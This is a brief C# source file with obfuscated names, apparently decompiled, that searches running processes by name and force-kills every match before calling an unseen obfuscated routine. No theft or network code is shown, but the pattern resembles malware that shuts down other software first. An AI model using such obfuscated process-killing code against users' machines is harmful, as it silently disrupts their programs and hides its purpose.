using System;
using System.Diagnostics;

namespace VyjVuXvolaw;

public sealed class KJScePBkBOY
{
	public static bool VknbdThKduIv(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void VJzQmVSnCj(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (VknbdThKduIv(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					CcLtuTEQJD.yuTzVjQdrCIsBY();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
